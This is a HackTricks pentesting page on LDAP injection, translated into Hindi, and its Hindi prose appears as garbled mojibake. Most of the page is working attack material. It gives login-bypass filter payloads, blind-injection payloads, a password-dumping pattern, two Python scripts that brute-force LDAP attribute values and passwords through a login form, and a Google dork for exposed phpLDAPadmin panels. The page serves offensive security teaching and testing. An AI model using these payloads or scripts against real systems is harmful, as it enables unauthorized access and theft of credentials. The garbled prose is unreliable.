# LDAP Injection

## LDAP Injection

{% hint style="success" %}
‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡§æ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **‡§π‡§Æ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á‡§Ç** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ **‡§π‡§Æ‡•á‡§Ç** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç‡•§**
* ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

‡§Ø‡§¶‡§ø ‡§Ü‡§™ **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡§∞‡§ø‡§Ø‡§∞** ‡§Æ‡•á‡§Ç ‡§∞‡•Å‡§ö‡§ø ‡§∞‡§ñ‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§Ö‡§π‡•á‡§ï ‡§ï‡§∞‡§®‡•á ‡§Ø‡•ã‡§ó‡•ç‡§Ø ‡§ï‡•ã ‡§π‡•à‡§ï ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç - **‡§π‡§Æ ‡§≠‡§∞‡•ç‡§§‡•Ä ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç!** (_‡§´‡•ç‡§≤‡•Ç‡§è‡§Ç‡§ü ‡§™‡•ã‡§≤‡§ø‡§∂ ‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§î‡§∞ ‡§Æ‡•å‡§ñ‡§ø‡§ï ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à_)‡•§

{% embed url="https://www.stmcyber.com/careers" %}

## LDAP Injection

### **LDAP**

**‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ú‡§æ‡§®‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø LDAP ‡§ï‡•ç‡§Ø‡§æ ‡§π‡•à, ‡§§‡•ã ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§™‡•É‡§∑‡•ç‡§† ‡§™‡§∞ ‡§ú‡§æ‡§è‡§Ç:**

{% content-ref url="../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

**LDAP Injection** ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ ‡§π‡•à ‡§ú‡•ã ‡§µ‡•á‡§¨ ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó‡•ã‡§Ç ‡§ï‡•ã ‡§≤‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§á‡§®‡§™‡•Å‡§ü ‡§∏‡•á LDAP ‡§ï‡§•‡§® ‡§¨‡§®‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ø‡§π ‡§§‡§¨ ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡§¨ ‡§Ö‡§®‡•Å‡§™‡•ç‡§∞‡§Ø‡•ã‡§ó **‡§á‡§®‡§™‡•Å‡§ü ‡§ï‡•ã ‡§∏‡§π‡•Ä ‡§¢‡§Ç‡§ó ‡§∏‡•á ‡§∏‡§æ‡§´‡§º ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§´‡§≤ ‡§∞‡§π‡§§‡§æ ‡§π‡•à**, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞‡•ã‡§Ç ‡§ï‡•ã **‡§∏‡•ç‡§•‡§æ‡§®‡•Ä‡§Ø ‡§™‡•ç‡§∞‡•â‡§ï‡•ç‡§∏‡•Ä ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á LDAP ‡§ï‡§•‡§®‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§π‡•á‡§∞‡§´‡•á‡§∞ ‡§ï‡§∞‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à, ‡§ú‡•ã ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ö‡§®‡§ß‡§ø‡§ï‡•É‡§§ ‡§™‡§π‡•Å‡§Ç‡§ö ‡§Ø‡§æ ‡§°‡•á‡§ü‡§æ ‡§π‡•á‡§∞‡§´‡•á‡§∞ ‡§ï‡§æ ‡§ï‡§æ‡§∞‡§£ ‡§¨‡§® ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

{% file src="../.gitbook/assets/EN-Blackhat-Europe-2008-LDAP-Injection-Blind-LDAP-Injection.pdf" %}

**Filter** = ( filtercomp )\
**Filtercomp** = ‡§î‡§∞ / ‡§Ø‡§æ / ‡§®‡§π‡•Ä‡§Ç / ‡§Ü‡§á‡§ü‡§Æ\
**And** = & filterlist\
**Or** = |filterlist\
**Not** = ! filter\
**Filterlist** = 1\*filter\
**Item**= ‡§∏‡§∞‡§≤ / ‡§â‡§™‡§∏‡•ç‡§•‡§ø‡§§ / ‡§â‡§™‡§∏‡§∞‡•ç‡§ó\
**Simple** = attr filtertype assertionvalue\
**Filtertype** = _'=' / '\~=' / '>=' / '<='_\
**Present** = attr = \*\
**Substring** = attr ‚Äù=‚Äù \[‡§™‡•ç‡§∞‡§æ‡§∞‡§Ç‡§≠‡§ø‡§ï] \* \[‡§Ö‡§Ç‡§§‡§ø‡§Æ]\
**Initial** = assertionvalue\
**Final** = assertionvalue\
&#xNAN;**(&)** = ‡§™‡•Ç‡§∞‡•ç‡§£ TRUE\
&#xNAN;**(|)** = ‡§™‡•Ç‡§∞‡•ç‡§£ FALSE

‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è:\
`(&(!(objectClass=Impresoras))(uid=s*))`\
`(&(objectClass=user)(uid=*))`

‡§Ü‡§™ ‡§°‡•á‡§ü‡§æ‡§¨‡•á‡§∏ ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§î‡§∞ ‡§á‡§∏‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

**OpenLDAP**: ‡§Ø‡§¶‡§ø 2 ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§Ü‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§ï‡•á‡§µ‡§≤ ‡§™‡§π‡§≤‡•á ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§\
**ADAM ‡§Ø‡§æ Microsoft LDS**: 2 ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§µ‡•á ‡§è‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§´‡•á‡§Ç‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§\
**SunOne Directory Server 5.0**: ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§

**‡§Ø‡§π ‡§¨‡§π‡•Å‡§§ ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•à ‡§ï‡§ø ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§∏‡§π‡•Ä ‡§∏‡§ø‡§Ç‡§ü‡•à‡§ï‡•ç‡§∏ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§è ‡§Ø‡§æ ‡§è‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§´‡•á‡§Ç‡§ï‡•Ä ‡§ú‡§æ‡§è‡§ó‡•Ä‡•§ ‡§ï‡•á‡§µ‡§≤ 1 ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§≠‡•á‡§ú‡§®‡§æ ‡§¨‡•á‡§π‡§§‡§∞ ‡§π‡•à‡•§**

‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§∂‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è: `&` ‡§Ø‡§æ `|`\
‡§â‡§¶‡§æ‡§π‡§∞‡§£: `(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))`\
`VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

‡§´‡§ø‡§∞: `(&(objectClass=`**`*)(ObjectClass=*))`** ‡§™‡§π‡§≤‡§æ ‡§´‡§º‡§ø‡§≤‡•ç‡§ü‡§∞ ‡§π‡•ã‡§ó‡§æ (‡§ú‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à)‡•§

### ‡§≤‡•â‡§ó‡§ø‡§® ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏

LDAP ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•ã‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§à ‡§™‡•ç‡§∞‡§æ‡§∞‡•Ç‡§™‡•ã‡§Ç ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à: ‡§∏‡•ç‡§™‡§∑‡•ç‡§ü, md5, smd5, sh1, sha, crypt‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§π ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ ‡§ú‡•ã ‡§≠‡•Ä ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§≤‡•á‡§Ç, ‡§µ‡§π ‡§π‡•à‡§∂ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•ã‡•§
```bash
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```

```bash
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

```bash
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```bash
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```bash
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```bash
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) ‚Äî> As (|) is FALSE then the user is admin and the password check is True.
```

```bash
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

```bash
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```
#### ‡§∏‡•Ç‡§ö‡§ø‡§Ø‡§æ‡§Å

* [LDAP\_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt)
* [LDAP ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§è‡§Å](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_attributes.txt)
* [LDAP PosixAccount ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§è‡§Å](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

### ‡§¨‡•ç‡§≤‡§æ‡§á‡§Ç‡§° LDAP ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§∂‡§®

‡§Ü‡§™ ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§°‡•á‡§ü‡§æ ‡§ï‡•á ‡§≤‡•å‡§ü‡§®‡•á ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§¨‡•ç‡§≤‡§æ‡§á‡§Ç‡§° LDAP ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•Ä ‡§™‡•Å‡§∑‡•ç‡§ü‡§ø ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è False ‡§Ø‡§æ True ‡§™‡•ç‡§∞‡§§‡§ø‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```

```bash
#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```
#### Dump data

‡§Ü‡§™ ascii ‡§Ö‡§ï‡•ç‡§∑‡§∞‡•ã‡§Ç, ‡§Ö‡§Ç‡§ï‡•ã‡§Ç ‡§î‡§∞ ‡§™‡•ç‡§∞‡§§‡•Ä‡§ï‡•ã‡§Ç ‡§™‡§∞ ‡§™‡•Å‡§®‡§∞‡§æ‡§µ‡•É‡§§‡•ç‡§§‡§ø ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```
### Scripts

#### **‡§Æ‡§æ‡§®‡•ç‡§Ø LDAP ‡§´‡§º‡•Ä‡§≤‡•ç‡§° ‡§ñ‡•ã‡§ú‡•á‡§Ç**

LDAP ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü‡•ç‡§∏ **‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ï‡§à ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§è‡§Å** ‡§∞‡§ñ‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã **‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§∏‡§π‡•á‡§ú‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡§Ç‡•§ ‡§Ü‡§™ **‡§â‡§® ‡§∏‡§≠‡•Ä ‡§ï‡•ã ‡§¨‡•ç‡§∞‡•Ç‡§ü-‡§´‡•ã‡§∞‡•ç‡§∏ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§â‡§∏ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•ã ‡§®‡§ø‡§ï‡§æ‡§≤‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§** ‡§Ü‡§™ [**‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü LDAP ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§∏‡•Ç‡§ö‡•Ä ‡§Ø‡§π‡§æ‡§Å**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt) ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§
```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
value = ""
finish = False
while not finish:
for char in alphabet: #In each possition test each possible printable char
query = f"*)({attribute}={value}{char}*"
data = {'login':query, 'password':'bla'}
r = requests.post(url, data=data, proxies=proxy)
sys.stdout.write(f"\r{attribute}: {value}{char}")
#sleep(0.5) #Avoid brute-force bans
if "Cannot login" in r.text:
value += str(char)
break

if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
finish = True
print()
```
#### **‡§µ‡§ø‡§∂‡•á‡§∑ ‡§¨‡•ç‡§≤‡§æ‡§á‡§Ç‡§° LDAP ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§∂‡§® (‡§¨‡§ø‡§®‡§æ "\*")**
```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
print("[i] Looking for number " + str(i))
for char in alphabet:
r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
if ("TRUE CONDITION" in r.text):
flag += char
print("[+] Flag: " + flag)
break
```
### ‡§ó‡•Ç‡§ó‡§≤ ‡§°‡•â‡§∞‡•ç‡§ï‡•ç‡§∏
```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```
### More Payloads

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

‡§Ø‡§¶‡§ø ‡§Ü‡§™ **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡§∞‡§ø‡§Ø‡§∞** ‡§Æ‡•á‡§Ç ‡§∞‡•Å‡§ö‡§ø ‡§∞‡§ñ‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§Ö‡§ú‡•á‡§Ø ‡§ï‡•ã ‡§π‡•à‡§ï ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç - **‡§π‡§Æ ‡§≠‡§∞‡•ç‡§§‡•Ä ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç!** (_‡§´‡•ç‡§≤‡•Ç‡§è‡§Ç‡§ü ‡§™‡•ã‡§≤‡§ø‡§∂ ‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§î‡§∞ ‡§Æ‡•å‡§ñ‡§ø‡§ï ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à_)‡•§

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **‡§π‡§Æ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á‡§Ç** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ **‡§π‡§Æ‡•á‡§Ç** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç‡•§**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
